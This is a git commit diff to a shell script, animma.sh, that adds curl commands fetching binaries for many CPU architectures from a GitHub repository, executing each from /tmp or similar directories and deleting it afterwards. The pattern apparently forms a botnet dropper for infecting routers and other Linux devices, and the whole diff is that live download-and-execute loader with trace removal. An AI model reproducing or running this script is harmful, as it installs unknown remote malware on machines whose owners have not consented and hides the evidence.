00fe723d95efb724c1c7254b558332ab4454611f
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-11-10 09:49:17 +0500

    Update animma.sh

--- animma.sh
+++ animma.sh
@@ -6,3 +6,10 @@ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubus
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/armv5l; chmod +x armv5l; ./armv5l; rm -rf armv5l
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/armv4l; chmod +x armv4l; ./armv4l; rm -rf armv4l
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/x86_64; chmod +x x86_64; ./x86_64; rm -rf x86_64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -LO https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/mips; chmod +x mips; ./mips; rm -rf mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -LO https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -LO https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/armv7l; chmod +x armv7l; ./armv7l; rm -rf armv7l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -LO https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/armv6l; chmod +x armv6l; ./armv6l; rm -rf armv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -LO https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/armv5l; chmod +x armv5l; ./armv5l; rm -rf armv5l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -LO https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/armv4l; chmod +x armv4l; ./armv4l; rm -rf armv4l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -LO https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/x86_64; chmod +x x86_64; ./x86_64; rm -rf x86_64
